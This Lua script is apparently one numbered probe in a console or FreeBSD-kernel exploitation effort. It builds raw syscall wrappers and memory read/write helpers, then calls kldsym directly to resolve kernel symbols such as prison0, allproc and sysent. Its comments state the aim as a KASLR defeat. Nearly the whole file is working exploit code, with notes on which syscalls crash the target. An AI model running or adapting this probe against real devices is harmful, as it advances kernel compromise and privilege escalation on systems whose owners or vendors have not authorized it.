-- CRASH_CLASS: HIGH
-- PROBE 57c: Direct kldsym(337) without kldnext — KASLR defeat attempt
--
-- Context: kldnext(307) and kldstat(308) are confirmed lethal on 14.10 (probes 56k4/56k5).
-- kldsym(337) was NEVER directly tested because previous probes called kldnext first,
-- which killed the process before reaching kldsym.
--
-- kldsym resolves kernel symbols by name. If it works with fileid=0 (kernel itself),
-- it returns the kernel address of named symbols — instant KASLR defeat.
--
-- FreeBSD kldsym signature: kldsym(int fileid, int cmd, struct kld_sym_lookup *data)
-- cmd=1 = KLDSYM_LOOKUP
-- struct kld_sym_lookup { int version; char *symname; u_long symvalue; size_t symsize; }

print("=== PROBE 57c: DIRECT kldsym(337) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("[*] Canary: probe 57c alive")

local sc_kldsym = make_syscall(337)

-- Symbols to try resolving (any one = KASLR defeat)
local symbols = {
    "prison0",
    "allproc",
    "kernel_pmap",
    "copyout",
    "copyin",
    "sysent",
}

-- struct kld_sym_lookup layout (FreeBSD):
-- +0x00: int version (sizeof(struct kld_sym_lookup) = 0x20 on amd64)
-- +0x08: char *symname (pointer to symbol name string)
-- +0x10: u_long symvalue (output: symbol address)
-- +0x18: size_t symsize (output: symbol size)

for _, sym in ipairs(symbols) do
    print("")
    print("[*] Trying kldsym for: " .. sym)

    -- Allocate name buffer and write symbol name
    local namebuf = memory.alloc(64)
    for i = 1, #sym do
        safe_wd(namebuf + (i-1), string.byte(sym, i))
    end
    safe_wd(namebuf + #sym, 0) -- null terminator
    -- Write as bytes, not dwords
    for i = 1, #sym do
        local ok = pcall(function()
            memory.write_byte(namebuf + (i-1), string.byte(sym, i))
        end)
        if not ok then
            -- fallback: write as dwords
            break
        end
    end

    -- Allocate kld_sym_lookup struct (0x20 bytes)
    local lookup = memory.alloc(0x40)
    -- Zero it
    for i = 0, 0x3F, 4 do safe_wd(lookup + i, 0) end

    -- version = sizeof(struct kld_sym_lookup) = 0x20
    safe_wd(lookup + 0x00, 0x20)
    -- symname pointer
    safe_wq(lookup + 0x08, uint64(namebuf))
    -- symvalue and symsize will be filled by kernel

    -- Call kldsym(0, KLDSYM_LOOKUP=1, &lookup)
    -- fileid=0 means the kernel itself
    local ok, ret = pcall(function()
        return sc_kldsym(uint64(0), uint64(1), uint64(lookup))
    end)

    if not ok then
        print("  [!] PCALL FAILED (crash or exception)")
        print("  [!] If you see this, kldsym is lethal too")
        break
    end

    local rv = to_num(ret)
    print("  ret=" .. rv)

    if rv == 0 then
        -- SUCCESS! Read the symbol value
        local val = safe_rq(lookup + 0x10)
        if val then
            local h, l = get_hi_lo(val)
            print("  [!!!] SYMBOL VALUE: 0x" .. string.format("%X%08X", h, l))
            if h >= 0xFFFF8000 then
                print("  [!!!] KERNEL POINTER FOUND — KASLR DEFEATED!")
            end
        end
        local sz = safe_rq(lookup + 0x18)
        if sz then
            local sh, sl = get_hi_lo(sz)
            print("  symsize: 0x" .. string.format("%X%08X", sh, sl))
        end
    else
        print("  [x] Failed (ret=" .. rv .. ")")
    end
end

-- Also try fileid=1 (first loaded module, usually kernel)
print("")
print("[*] Trying kldsym with fileid=1...")
local namebuf2 = memory.alloc(64)
local s = "prison0"
for i = 1, #s do
    pcall(function() memory.write_byte(namebuf2 + (i-1), string.byte(s, i)) end)
end
pcall(function() memory.write_byte(namebuf2 + #s, 0) end)

local lookup2 = memory.alloc(0x40)
for i = 0, 0x3F, 4 do safe_wd(lookup2 + i, 0) end
safe_wd(lookup2 + 0x00, 0x20)
safe_wq(lookup2 + 0x08, uint64(namebuf2))

local ok2, ret2 = pcall(function()
    return sc_kldsym(uint64(1), uint64(1), uint64(lookup2))
end)
if ok2 then
    local rv2 = to_num(ret2)
    print("  fileid=1 ret=" .. rv2)
    if rv2 == 0 then
        local val2 = safe_rq(lookup2 + 0x10)
        if val2 then
            local h2, l2 = get_hi_lo(val2)
            print("  [!!!] SYMBOL VALUE: 0x" .. string.format("%X%08X", h2, l2))
        end
    end
else
    print("  [!] PCALL FAILED with fileid=1")
end

print("")
print("=== PROBE 57c COMPLETE ===")
